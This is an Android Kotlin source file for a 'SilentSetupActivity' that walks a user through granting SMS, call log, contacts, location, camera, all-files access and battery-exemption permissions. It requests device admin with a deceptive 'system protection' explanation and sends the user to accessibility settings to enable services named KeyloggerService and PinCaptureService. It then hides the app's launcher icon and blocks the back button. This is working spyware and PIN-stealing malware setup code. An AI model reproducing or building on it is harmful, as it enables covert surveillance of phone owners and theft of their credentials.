package com.kztutorial99.androidconnector

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class SilentSetupActivity : AppCompatActivity() {

    private val handler = Handler(Looper.getMainLooper())
    private val dpm by lazy { getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager }
    private val adminComponent by lazy { ComponentName(this, AppDeviceAdminReceiver::class.java) }

    private val permissions = mutableListOf(
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.CAMERA,
        Manifest.permission.READ_PHONE_STATE,
    )

    private var permissionIndex = 0

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestNextPermission()
    }

    // ── Runtime permissions ──────────────────────────────────────────────────

    private fun requestNextPermission() {
        while (permissionIndex < permissions.size) {
            val perm = permissions[permissionIndex]
            if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
                permissionIndex++
            } else break
        }
        if (permissionIndex >= permissions.size) {
            requestSpecialPermissions()
            return
        }
        ActivityCompat.requestPermissions(this, arrayOf(permissions[permissionIndex]), 1000 + permissionIndex)
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        permissionIndex++
        handler.postDelayed({ requestNextPermission() }, 300)
    }

    // ── Storage ──────────────────────────────────────────────────────────────

    private fun requestSpecialPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            try {
                startActivityForResult(
                    Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                        data = Uri.parse("package:$packageName")
                    }, 2001
                )
                return
            } catch (_: Exception) {}
        }
        requestBatteryOptimization()
    }

    // ── Battery optimization ─────────────────────────────────────────────────

    private fun requestBatteryOptimization() {
        val pm = getSystemService(PowerManager::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M &&
            !pm.isIgnoringBatteryOptimizations(packageName)) {
            try {
                startActivityForResult(
                    Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    }, 2002
                )
                return
            } catch (_: Exception) {}
        }
        requestDeviceAdmin()
    }

    // ── Device Admin ─────────────────────────────────────────────────────────

    private fun requestDeviceAdmin() {
        if (!dpm.isAdminActive(adminComponent)) {
            try {
                startActivityForResult(
                    Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                        putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                        putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk proteksi sistem.")
                    }, 2003
                )
                return
            } catch (_: Exception) {}
        }
        requestAccessibility()
    }

    // ── Accessibility (Keylogger + PIN Capture) ───────────────────────────────

    private fun isAccessibilityEnabled(serviceClass: Class<*>): Boolean {
        val expected = ComponentName(this, serviceClass)
        val enabled  = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            ?: return false
        val splitter = TextUtils.SimpleStringSplitter(':')
        splitter.setString(enabled)
        while (splitter.hasNext()) {
            val cn = ComponentName.unflattenFromString(splitter.next())
            if (cn != null && cn == expected) return true
        }
        return false
    }

    private fun requestAccessibility() {
        val keylogOk  = isAccessibilityEnabled(KeyloggerService::class.java)
        val pinOk     = isAccessibilityEnabled(PinCaptureService::class.java)
        if (!keylogOk || !pinOk) {
            try {
                startActivityForResult(
                    Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS),
                    2005
                )
                return
            } catch (_: Exception) {}
        }
        finishSetup()
    }

    // ── onActivityResult ─────────────────────────────────────────────────────

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        handler.postDelayed({
            when (requestCode) {
                2001 -> requestBatteryOptimization()
                2002 -> requestDeviceAdmin()
                2003 -> requestAccessibility()
                2004 -> finishSetup()
            }
        }, 400)
    }

    // ── Finish ───────────────────────────────────────────────────────────────

    private fun finishSetup() {
        try {
            packageManager.setComponentEnabledSetting(
                ComponentName(this, "$packageName.MainLauncherAlias"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (_: Exception) {}

        getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
            .edit().putBoolean("setup_done", true).apply()

        finish()
    }

    override fun onBackPressed() {
        // Blokir back selama setup
    }
}
